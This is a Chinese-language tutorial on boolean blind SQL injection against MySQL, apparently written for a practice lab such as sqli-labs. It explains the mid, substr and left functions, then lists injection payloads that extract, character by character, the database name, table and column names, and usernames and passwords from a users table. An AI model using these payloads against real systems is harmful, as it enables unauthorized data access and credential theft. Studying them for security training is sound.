    一.介绍bool运用：

    主要介绍三个函数：

    （下述的函数不仅仅可以单独使用还可以与ascii等函数组合使用）

    1.mid

    eg：mid(database(),1,1)=’a’

    通过=右侧字母的改变和表达式的真假判断库名

    2.substr

    与mid用法类似。

    用法：substr(string string,num start,num length);

    string为字符串；start为起始位置；length为长度。

    注意：mysql中的start是从1开始的。

    eg：substr(database(),1,1)=’a’

    通过=右侧字母的改变和表达式的真假判断库名。

    3.left

    此函数用法：left(a,b)

    从左侧截取 a 的前 b 位

    例：left(database(),1)=’a’

    通过=右侧字母的改变和表达式的真假判断库名。

    3.爆库名：

    A.法一：

    单独使用substr函数

    直接盲猜eg: ?id=1’ and substr(database(),1,1)=’s’ –+(不推荐使用，太莽了，且最致命的是不知道库名的长度，注意：当某个位置的字符的ascii等于0，说明此处已经没有字母了）

    通过判断是否正确来判断库名的第x个字母。（请看上述substr函数的介绍）

    B.法二：

    组合使用ascii和substr。

    1.先判断库名的长度：

    ?id=1’ and length(database())>7–+

    这里>后面的数字叠加来推断，当变为8时报错，因此库名长度为7.

    2.爆库名：

    ?id=1’ and ascii(substr(database(),1,1))>115–+

    类似的判断，请结合ascii表。

    注释：可以使用二分法来提高效率。

    4.爆表名：

    ?id=1’and ascii(substring((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))>0–+

    注释：这里的limit 0,1表示的是库中的第一个表，而后面的1,1为substr函数的结构。

    5.爆列名：

    ?id=1’and ascii(substring((select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’limit 0,1),1,1))>0 –+

    6.爆数据：

    ?id=1’and ascii(substring((select id from users limit 0,1),1,1))>0–+
    ?id=1’and ascii(substring((select password from users limit 0,1),1,1))>0–+
    ?id=1’and ascii(substring((select username from users limit 0,1),1,1))>0–+
